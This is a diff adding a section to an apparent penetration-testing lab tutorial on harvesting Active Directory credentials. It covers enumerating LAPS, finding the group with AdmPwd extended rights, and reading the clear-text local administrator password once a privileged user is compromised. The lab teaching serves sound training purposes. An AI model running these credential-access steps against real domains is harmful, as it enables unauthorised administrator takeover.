@@ -286,6 +286,80 @@ user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -security path/to/
 
 
 
+Local Administrator Password Solution (LAPS)
+
+
+In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password.
+
+The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd.
+
+Enumerate for LAPS
+
+The provided VM has the LAPS enabled, so let's start enumerating it. First, we check if LAPS is installed in the target machine, which can be done by checking the admpwd.dll path.
+
+Enumerating for LAPS
+C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
+
+The output confirms that we have LAPS on the machine. Let's check the available commands to use for AdmPwd cmdlets as follows,
+
+Listing the available PowerShell cmdlets for LAPS
+PS C:\Users\thm> Get-Command *AdmPwd*
+
+Next, we need to find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet to provide the right OU. Note that getting the available OUs could be done in the enumeration step. Our OU target in this example is THMorg. You can use the -Identity *  argument to list all available OUs.
+
+Finding Users with AdmPwdExtendedRights Attribute
+PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg
+
+ObjectDN                                      ExtendedRightHolders
+--------                                      --------------------
+OU=THMorg,DC=thm,DC=red                       {THM\THMGroupReader}
+The output shows that the THMGroupReader group in THMorg has the right access to LAPS. Let's check the group and its members.
+
+Finding Users belong to THMGroupReader Group
+PS C:\Users\thm> net groups "THMGroupReader"
+Group name     THMGroupReader
+Comment
+
+Members
+
+-------------------------------------------------------------------------------
+bk-admin
+The command completed successfully.
+
+PS C:\Users\victim> net user test-admin
+User name                    test-admin
+Full Name                    THM Admin Test Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+[** Removed **]
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Domain Admins
+                             *THMGroupReader           *Enterprise Admins
+The command completed successfully.
+Getting the Password
+
+We found that the bk-admin user is a member of THMGroupReader, so in order to get the LAPS password, we need to compromise or impersonate the bk-admin user. After compromising the right user, we can get the LAPS password using Get-AdmPwdPassword cmdlet by providing the target machine with LAPS enabled.
+
+Getting LAPS Password with the Right User
+PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin
+
+ComputerName         DistinguishedName                             Password           ExpirationTimestamp
+------------         -----------------                             --------           -------------------
+CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword    2/11/2338 11:05:2...
+It is important to note that in a real-world AD environment, the LAPS is enabled on specific machines only. Thus, you need to enumerate and find the right target computer as well as the right user account to be able to get the LAPS password. There are many scripts to help with this, but we included the LAPSToolkit PowerShell script in C:\Tool to try it out.
+
+
+
+
+
+
+
+
 
 
 
